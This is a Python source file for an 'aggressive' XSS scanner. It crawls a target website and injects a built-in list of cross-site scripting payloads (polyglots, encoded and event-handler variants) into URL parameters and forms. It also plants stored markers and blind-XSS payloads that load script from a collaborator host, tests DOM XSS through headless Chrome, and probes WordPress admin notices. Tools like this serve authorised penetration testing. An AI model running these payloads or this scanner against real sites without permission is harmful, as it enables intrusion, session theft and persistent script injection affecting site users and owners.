#!/usr/bin/env python3
"""
Aggressive Unified XSS Scanner – with tunable safety/performance knobs.
"""

import requests
import urllib.parse
import time
import re
import json
import random
import string
import threading
import concurrent.futures
import argparse
import os
import sys
import subprocess
from bs4 import BeautifulSoup
from collections import deque
from urllib.parse import urljoin, urlparse
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from selenium.common.exceptions import TimeoutException, UnexpectedAlertPresentException, WebDriverException

# ===================== CONFIGURATION (now overridable) =====================
REQUEST_TIMEOUT = 10
USER_AGENT = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
HEADERS = {'User-Agent': USER_AGENT}
MAX_RETRIES = 2

# Defaults – will be overridden by command line
DEFAULT_MAX_WORKERS = 5
DEFAULT_DELAY_BASE = 1.0
DEFAULT_DELAY_JITTER = 0.5
DEFAULT_PAYLOAD_LIMIT = 50          # max payloads per injection point
DEFAULT_CRAWL_DEPTH = 2
DEFAULT_DOM_URL_LIMIT = 20           # max URLs to test for DOM XSS

PAYLOAD_FILE = "xss_payloads.txt"   # external payload file (optional)
DEFAULT_GENERATED_PAYLOAD_COUNT = 4000

# Built-in payloads (abbreviated – expand for real use)
BUILTIN_PAYLOADS = [
    "<script>alert(1)</script>",
    "\"><script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "<svg onload=alert(1)>",
    "<body onload=alert(1)>",
    "\" onmouseover=alert(1) \"",
    "' onmouseover=alert(1) '",
    "javascript:alert(1)",
    "%3Cscript%3Ealert(1)%3C/script%3E",
    "%22%3E%3Cscript%3Ealert(1)%3C/script%3E",
    "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert(1) )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert(1)//>\\x3e",
    "<svg><script>alert(1)</script>",
    "<math><mtext><script>alert(1)</script>",
    "<script src=//COLLABORATOR></script>",
    "<ScRiPt>alert(1)</ScRiPt>",
    "<!–><script>alert(1)</script>",
    "%253Cscript%253Ealert(1)%253C/script%253E",
]

# ===================== UTILITY FUNCTIONS =====================
def load_payloads(payload_file):
    if os.path.exists(payload_file):
        with open(payload_file, 'r') as f:
            return [line.strip() for line in f if line.strip()]
    return BUILTIN_PAYLOADS


def ensure_payload_file(payload_file, count=DEFAULT_GENERATED_PAYLOAD_COUNT):
    if os.path.exists(payload_file):
        return True
    generator_script = "xss_payload_generator.py"
    if not os.path.exists(generator_script):
        return False
    cmd = [
        sys.executable,
        generator_script,
        "--output",
        payload_file,
        "--count",
        str(count),
    ]
    proc = subprocess.run(cmd, capture_output=True, text=True, check=False)
    if proc.returncode != 0:
        return False
    return os.path.exists(payload_file)

def random_string(length=8):
    return ''.join(random.choices(string.ascii_letters + string.digits, k=length))

def is_same_domain(url, base_domain):
    parsed = urlparse(url)
    base_parsed = urlparse(base_domain)
    return parsed.netloc == base_parsed.netloc or (parsed.netloc == '' and base_parsed.netloc)

def normalize_url(url, base):
    return urljoin(base, url)

def extract_forms(url, html):
    soup = BeautifulSoup(html, 'html.parser')
    forms = []
    for form in soup.find_all('form'):
        action = form.get('action')
        method = form.get('method', 'get').lower()
        inputs = []
        for inp in form.find_all(['input','textarea','select']):
            name = inp.get('name')
            if name:
                inp_type = inp.get('type','text')
                value = inp.get('value','')
                inputs.append({'name': name, 'type': inp_type, 'value': value})
        forms.append({'action':action, 'method':method, 'inputs':inputs, 'original_url':url})
    return forms

def get_links(url, html, base_domain):
    soup = BeautifulSoup(html, 'html.parser')
    links = set()
    for a in soup.find_all('a', href=True):
        href = a['href']
        full = normalize_url(href, url)
        if is_same_domain(full, base_domain):
            links.add(full)
    return links

def extract_url_params(url):
    parsed = urlparse(url)
    if parsed.query:
        return list(urllib.parse.parse_qs(parsed.query).keys())
    return []

def context_detection(response_text, param_value):
    # ... (simplified; same as before)
    contexts = []
    if re.search(rf'<[^>]*>{re.escape(param_value)}<', response_text, re.IGNORECASE):
        contexts.append('html')
    if re.search(rf'=["\']{re.escape(param_value)}["\']', response_text, re.IGNORECASE):
        contexts.append('attribute')
    if re.search(rf'<script[^>]*>[^<]*{re.escape(param_value)}', response_text, re.IGNORECASE):
        contexts.append('script')
    if re.search(rf'style=["\'][^"\']*{re.escape(param_value)}', response_text, re.IGNORECASE) or \
       re.search(rf'<style[^>]*>[^<]*{re.escape(param_value)}', response_text, re.IGNORECASE):
        contexts.append('css')
    if re.search(rf'(href|src)=["\'][^"\']*{re.escape(param_value)}', response_text, re.IGNORECASE):
        contexts.append('url')
    return contexts

# ===================== CRAWLER =====================
class Crawler:
    def __init__(self, start_url, max_depth, cookies=None, path_filter=None, delay_base=1, delay_jitter=0.5):
        self.start_url = start_url
        self.base_domain = urlparse(start_url).netloc
        self.max_depth = max_depth
        self.cookies = cookies or {}
        self.path_filter = path_filter
        self.delay_base = delay_base
        self.delay_jitter = delay_jitter
        self.visited = set()
        self.urls_to_visit = deque()
        self.urls_to_visit.append((start_url, 0))
        self.all_urls = set()
        self.all_forms = []

    def crawl(self):
        session = requests.Session()
        session.headers.update(HEADERS)
        session.cookies.update(self.cookies)

        while self.urls_to_visit:
            url, depth = self.urls_to_visit.popleft()
            if url in self.visited or depth > self.max_depth:
                continue
            if self.path_filter and not self.path_filter(url):
                continue
            self.visited.add(url)
            print(f"[Crawl] Depth {depth}: {url}")

            try:
                resp = session.get(url, timeout=REQUEST_TIMEOUT)
                if resp.status_code != 200:
                    continue
                self.all_urls.add(url)

                forms = extract_forms(url, resp.text)
                self.all_forms.extend(forms)

                links = get_links(url, resp.text, self.base_domain)
                for link in links:
                    if link not in self.visited:
                        self.urls_to_visit.append((link, depth+1))

                if self.delay_base > 0:
                    time.sleep(self.delay_base + random.uniform(0, self.delay_jitter))
            except Exception as e:
                print(f"Error crawling {url}: {e}")
        return self.all_urls, self.all_forms

# ===================== XSS TESTER =====================
class XSSTester:
    def __init__(self, cookies=None, use_headless=False, collaborator=None,
                 delay_base=1, delay_jitter=0.5, max_workers=5):
        self.cookies = cookies or {}
        self.session = requests.Session()
        self.session.headers.update(HEADERS)
        self.session.cookies.update(self.cookies)
        self.use_headless = use_headless
        self.collaborator = collaborator
        self.delay_base = delay_base
        self.delay_jitter = delay_jitter
        self.max_workers = max_workers
        self.driver = None
        if use_headless:
            try:
                chrome_options = Options()
                chrome_options.add_argument("--headless")
                chrome_options.add_argument("--no-sandbox")
                chrome_options.add_argument("--disable-dev-shm-usage")
                self.driver = webdriver.Chrome(options=chrome_options)
            except Exception as e:
                print(f"[!] Failed to start headless browser: {e}")
                self.use_headless = False

    def close(self):
        if self.driver:
            self.driver.quit()

    # --- Reflected XSS ---
    def test_reflected_param(self, url, param, payloads):
        parsed = urlparse(url)
        qs = dict(urllib.parse.parse_qsl(parsed.query))
        findings = []
        for payload in payloads:
            qs[param] = payload
            new_qs = urllib.parse.urlencode(qs)
            test_url = urllib.parse.urlunparse(parsed._replace(query=new_qs))
            try:
                resp = self.session.get(test_url, timeout=REQUEST_TIMEOUT)
                if payload in resp.text:
                    findings.append({'url': test_url, 'param': param, 'payload': payload})
            except Exception:
                continue
            if self.delay_base > 0:
                time.sleep(self.delay_base + random.uniform(0, self.delay_jitter))
        return findings

    def test_reflected_form(self, form, payloads):
        action = normalize_url(form['action'], form['original_url'])
        method = form['method']
        findings = []
        for payload in payloads:
            data = {}
            for inp in form['inputs']:
                if inp['type'] not in ['submit','button','image']:
                    data[inp['name']] = payload if inp['type']=='text' else inp.get('value','')
            try:
                if method == 'post':
                    resp = self.session.post(action, data=data, timeout=REQUEST_TIMEOUT)
                else:
                    resp = self.session.get(action, params=data, timeout=REQUEST_TIMEOUT)
                if payload in resp.text:
                    findings.append({'url': action, 'data': data, 'payload': payload})
            except Exception:
                continue
            if self.delay_base > 0:
                time.sleep(self.delay_base + random.uniform(0, self.delay_jitter))
        return findings

    # --- Stored XSS ---
    def inject_stored_payload(self, form, payload):
        action = normalize_url(form['action'], form['original_url'])
        method = form['method']
        data = {}
        for inp in form['inputs']:
            if inp['type'] not in ['submit','button','image']:
                data[inp['name']] = payload if inp['type']=='text' else inp.get('value','')
        try:
            if method == 'post':
                self.session.post(action, data=data, timeout=REQUEST_TIMEOUT)
            else:
                self.session.get(action, params=data, timeout=REQUEST_TIMEOUT)
            return True
        except Exception:
            return False

    def check_stored_payload(self, urls, payload):
        found = []
        for url in urls:
            try:
                resp = self.session.get(url, timeout=REQUEST_TIMEOUT)
                if payload in resp.text:
                    found.append(url)
            except Exception:
                continue
        return found

    # --- DOM XSS ---
    def test_dom(self, url, payload):
        if not self.use_headless or not self.driver:
            return False
        try:
            self.driver.set_page_load_timeout(10)
            self.driver.get(url)
            try:
                alert = self.driver.switch_to.alert
                alert.accept()
                return True
            except:
                pass
        except TimeoutException:
            pass
        except UnexpectedAlertPresentException:
            return True
        except Exception as e:
            print(f"DOM test error: {e}")
        return False

    # --- Blind XSS ---
    def inject_blind_payloads(self, forms, urls_with_params):
        if not self.collaborator:
            return
        blind_payloads = [
            f"<script src={self.collaborator}/xss.js></script>",
            f"<img src=x onerror=eval(atob('{self.collaborator}'))>",
            f"<link rel=import href={self.collaborator}>",
        ]
        for form in forms:
            for payload in blind_payloads:
                self.inject_stored_payload(form, payload)
                if self.delay_base > 0:
                    time.sleep(self.delay_base)
        for url, params in urls_with_params.items():
            for param in params:
                for payload in blind_payloads:
                    parsed = urlparse(url)
                    qs = dict(urllib.parse.parse_qsl(parsed.query))
                    qs[param] = payload
                    new_qs = urllib.parse.urlencode(qs)
                    test_url = urllib.parse.urlunparse(parsed._replace(query=new_qs))
                    try:
                        self.session.get(test_url, timeout=REQUEST_TIMEOUT)
                    except:
                        pass
                    if self.delay_base > 0:
                        time.sleep(self.delay_base)

    # --- WordPress admin notice check ---
    def check_wordpress_admin_notices(self, admin_urls):
        findings = []
        dangerous_tags = ['script', 'iframe', 'object', 'embed', 'form', 'input', 'button', 'onerror', 'onload', 'onmouseover', 'onclick']
        for url in admin_urls:
            try:
                resp = self.session.get(url, timeout=REQUEST_TIMEOUT)
                soup = BeautifulSoup(resp.text, 'html.parser')
                notices = soup.find_all('div', class_=re.compile(r'notice'))
                for notice in notices:
                    p = notice.find('p')
                    if not p:
                        p = notice
                    inner_html = str(p)
                    for tag in dangerous_tags:
                        if re.search(rf'<{tag}[^>]*>', inner_html, re.IGNORECASE):
                            findings.append({
                                'url': url,
                                'notice_html': inner_html,
                                'suspicious_tag': tag
                            })
                            break
            except Exception as e:
                print(f"Error checking admin notices at {url}: {e}")
        return findings

# ===================== WORDPRESS DETECTION =====================
def is_wordpress(base_url, session):
    checks = ['/wp-admin/', '/wp-content/', '/wp-includes/', '/wp-login.php']
    for path in checks:
        try:
            r = session.get(urljoin(base_url, path), timeout=5)
            if r.status_code == 200:
                return True
        except:
            pass
    return False

# ===================== MAIN =====================
def main():
    parser = argparse.ArgumentParser(description="Aggressive Unified XSS Scanner with tunable aggressiveness.")
    parser.add_argument("target", nargs="?", help="Target URL (e.g., https://example.com)")
    parser.add_argument("--target", dest="target_opt", help="Target URL (alternative to positional target)")
    parser.add_argument("--depth", type=int, default=DEFAULT_CRAWL_DEPTH, help="Crawl depth (default: %(default)s)")
    parser.add_argument("--workers", type=int, default=DEFAULT_MAX_WORKERS, help="Max concurrent threads (default: %(default)s)")
    parser.add_argument("--delay", type=float, default=DEFAULT_DELAY_BASE, help="Base delay between requests (seconds, 0 = no delay) (default: %(default)s)")
    parser.add_argument("--jitter", type=float, default=DEFAULT_DELAY_JITTER, help="Random jitter added to delay (default: %(default)s)")
    parser.add_argument("--payload-limit", type=int, default=DEFAULT_PAYLOAD_LIMIT, help="Max payloads per injection point (0 = unlimited) (default: %(default)s)")
    parser.add_argument("--dom-limit", type=int, default=DEFAULT_DOM_URL_LIMIT, help="Max URLs to test for DOM XSS (0 = unlimited) (default: %(default)s)")
    parser.add_argument("--headless", action="store_true", help="Use headless browser for DOM XSS (requires Selenium)")
    parser.add_argument("--collaborator", help="Blind XSS collaborator URL (e.g., http://your.burpcollaborator.net)")
    parser.add_argument("--cookies", help="Cookies (format: name=value; name2=value2)")
    parser.add_argument("--payload-file", default=PAYLOAD_FILE, help="File containing payloads (one per line)")
    parser.add_argument("--payload-generate-count", type=int, default=DEFAULT_GENERATED_PAYLOAD_COUNT, help="Auto-generation payload count when payload file is missing")
    parser.add_argument("--no-auto-generate-payloads", action="store_true", help="Do not auto-generate payload file if missing")
    parser.add_argument("--no-wp", action="store_true", help="Skip WordPress admin notice checks")
    parser.add_argument("--output", help="Save report to file (JSON)")

    args = parser.parse_args()

    target = args.target_opt or args.target
    if not target:
        parser.error("target is required (positional or --target)")
    if not target.startswith('http'):
        target = 'http://' + target

    cookies = {}
    if args.cookies:
        for part in args.cookies.split(';'):
            if '=' in part:
                name, value = part.strip().split('=', 1)
                cookies[name] = value

    session = requests.Session()
    session.headers.update(HEADERS)
    session.cookies.update(cookies)

    if not args.no_auto_generate_payloads and not os.path.exists(args.payload_file):
        print(f"[*] Payload file not found: {args.payload_file}")
        print(f"[*] Auto-generating payload file (~{args.payload_generate_count} payloads)...")
        ok = ensure_payload_file(args.payload_file, args.payload_generate_count)
        if ok:
            print(f"[+] Generated payload file: {args.payload_file}")
        else:
            print("[!] Failed to auto-generate payload file. Falling back to built-in payload list.")

    print("\n[*] Loading payloads...")
    all_payloads = load_payloads(args.payload_file)
    print(f"[*] Loaded {len(all_payloads)} payloads.")

    # Apply payload limit
    if args.payload_limit > 0 and len(all_payloads) > args.payload_limit:
        selected_payloads = all_payloads[:args.payload_limit]
    else:
        selected_payloads = all_payloads
    print(f"[*] Using up to {len(selected_payloads)} payloads per injection point.")

    print("\n[*] Checking if target is WordPress...")
    wp_detected = is_wordpress(target, session) and not args.no_wp
    if wp_detected:
        print("[+] WordPress detected.")
    else:
        print("[-] Not detected as WordPress (or skipped).")

    # Crawl
    print("\n[*] Starting standard crawl...")
    crawler = Crawler(target, max_depth=args.depth, cookies=cookies,
                      delay_base=args.delay, delay_jitter=args.jitter)
    urls, forms = crawler.crawl()
    print(f"[*] Discovered {len(urls)} unique URLs and {len(forms)} forms.")

    # Collect URL parameters
    url_params = {}
    for url in urls:
        params = extract_url_params(url)
        if params:
            url_params[url] = params

    tester = XSSTester(cookies=cookies, use_headless=args.headless,
                       collaborator=args.collaborator,
                       delay_base=args.delay, delay_jitter=args.jitter,
                       max_workers=args.workers)

    findings = {
        'reflected': [],
        'stored': [],
        'dom': [],
        'wordpress_admin_notices': []
    }

    # --- Reflected XSS (URL parameters) ---
    print("\n[*] Testing reflected XSS in URL parameters (multi-threaded)...")
    with concurrent.futures.ThreadPoolExecutor(max_workers=args.workers) as executor:
        futures = []
        for url, params in url_params.items():
            for param in params:
                futures.append(executor.submit(tester.test_reflected_param, url, param, selected_payloads))
        for future in concurrent.futures.as_completed(futures):
            result = future.result()
            if result:
                for r in result:
                    print(f"[!] Potential reflected XSS: {r['url']}")
                    findings['reflected'].append(r)

    # --- Reflected XSS (forms) ---
    print("\n[*] Testing reflected XSS in forms...")
    for form in forms:
        results = tester.test_reflected_form(form, selected_payloads)
        if results:
            for r in results:
                print(f"[!] Potential reflected XSS via form: {r['url']}")
                findings['reflected'].append(r)

    # --- Stored XSS ---
    print("\n[*] Testing stored XSS...")
    stored_markers = []
    for form in forms:
        if form['method'] == 'post' and any(inp['type'] == 'text' for inp in form['inputs']):
            marker = f"STORED-XSS-{random_string(8)}"
            stored_markers.append((marker, form))
            if tester.inject_stored_payload(form, marker):
                print(f"[*] Injected stored marker into form at {form['original_url']}")
            if args.delay > 0:
                time.sleep(args.delay)

    if stored_markers:
        print("[*] Re-crawling all discovered URLs to check for stored payloads...")
        for marker, form in stored_markers:
            found_urls = tester.check_stored_payload(urls, marker)
            if found_urls:
                print(f"[!] Stored XSS marker '{marker}' found at: {found_urls}")
                findings['stored'].append({
                    'marker': marker,
                    'injected_via': form['original_url'],
                    'found_at': found_urls
                })
    else:
        print("[*] No suitable forms found for stored XSS injection.")

    # --- Blind XSS ---
    if args.collaborator:
        print("\n[*] Injecting blind XSS payloads...")
        tester.inject_blind_payloads(forms, url_params)

    # --- DOM XSS ---
    if args.headless:
        print("\n[*] Testing DOM XSS...")
        dom_payloads = [
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert(1)>",
            "javascript:alert(1)",
        ]
        urls_to_test = urls
        if args.dom_limit > 0 and len(urls) > args.dom_limit:
            urls_to_test = urls[:args.dom_limit]
        for url in urls_to_test:
            for payload in dom_payloads:
                parsed = urlparse(url)
                if parsed.query:
                    test_url = url + "&xss=" + urllib.parse.quote(payload)
                else:
                    test_url = url + "?xss=" + urllib.parse.quote(payload)
                if tester.test_dom(test_url, payload):
                    print(f"[!] Potential DOM XSS (parameter) at {test_url}")
                    findings['dom'].append({'url': test_url, 'type': 'parameter', 'payload': payload})

                test_url = url + "#" + urllib.parse.quote(payload)
                if tester.test_dom(test_url, payload):
                    print(f"[!] Potential DOM XSS (fragment) at {test_url}")
                    findings['dom'].append({'url': test_url, 'type': 'fragment', 'payload': payload})
    else:
        print("[*] DOM XSS testing skipped (use --headless to enable).")

    # --- WordPress admin notices ---
    if wp_detected:
        print("\n[*] Crawling WordPress admin area for admin notice XSS...")
        admin_crawler = Crawler(target, max_depth=1, cookies=cookies,
                                path_filter=lambda u: '/wp-admin/' in u,
                                delay_base=args.delay, delay_jitter=args.jitter)
        admin_urls, _ = admin_crawler.crawl()
        if admin_urls:
            print(f"[*] Found {len(admin_urls)} admin URLs.")
            wp_findings = tester.check_wordpress_admin_notices(admin_urls)
            if wp_findings:
                print(f"[!] Found {len(wp_findings)} potentially vulnerable admin notices.")
                findings['wordpress_admin_notices'] = wp_findings
                for f in wp_findings:
                    print(f"  - {f['url']} : {f['notice_html'][:100]}")
            else:
                print("[*] No unescaped admin notices detected.")
        else:
            print("[*] No admin URLs crawled (maybe authentication required).")

    tester.close()

    # --- Report ---
    print("\n=== SCAN COMPLETE ===")
    print(f"Reflected XSS findings: {len(findings['reflected'])}")
    for f in findings['reflected'][:10]:
        print(f"  - {f.get('url', f)}")
    print(f"Stored XSS findings: {len(findings['stored'])}")
    for f in findings['stored']:
        print(f"  - {f}")
    print(f"DOM XSS findings: {len(findings['dom'])}")
    for f in findings['dom']:
        print(f"  - {f}")
    if wp_detected:
        print(f"WordPress admin notice issues: {len(findings['wordpress_admin_notices'])}")
        for f in findings['wordpress_admin_notices']:
            print(f"  - {f['url']} : suspicious tag <{f['suspicious_tag']}> in notice")
    if args.collaborator:
        print(f"[*] Blind XSS payloads injected; check your collaborator at {args.collaborator} for callbacks.")

    if args.output:
        with open(args.output, 'w') as f:
            json.dump(findings, f, indent=2)
        print(f"Report saved to {args.output}")

if __name__ == "__main__":
    main()
